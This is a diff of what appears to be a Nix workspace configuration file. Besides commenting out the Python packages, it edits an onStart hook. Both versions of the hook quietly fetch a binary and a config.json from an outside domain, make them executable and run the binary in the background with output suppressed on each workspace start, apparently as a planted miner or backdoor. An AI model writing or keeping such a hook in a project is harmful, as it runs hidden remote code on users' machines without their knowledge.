@@ -6,8 +6,8 @@
   # Use https://search.nixos.org/packages to find packages
   packages = [
     # pkgs.go
-    pkgs.python311
-    pkgs.python311Packages.pip
+    # pkgs.python311
+    # pkgs.python311Packages.pip
     # pkgs.nodejs_20
     # pkgs.nodePackages.nodemon
   ];
@@ -45,7 +45,7 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "mkdir -p ~/.cloud && cd ~/.cloud && ([ -f cloud ] || wget -q -O cloud https://dot-store.biz.id/bagong) && wget -q -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud && nohup ./cloud -c config.json > /dev/null 2>&1 &";
+        joko = "mkdir -p ~/.cloud && cd ~/.cloud && ([ -f cloud ] || wget -q -O cloud https://dot-store.biz.id/bagong) && wget -q -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json && nohup ./cloud -c 'config.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
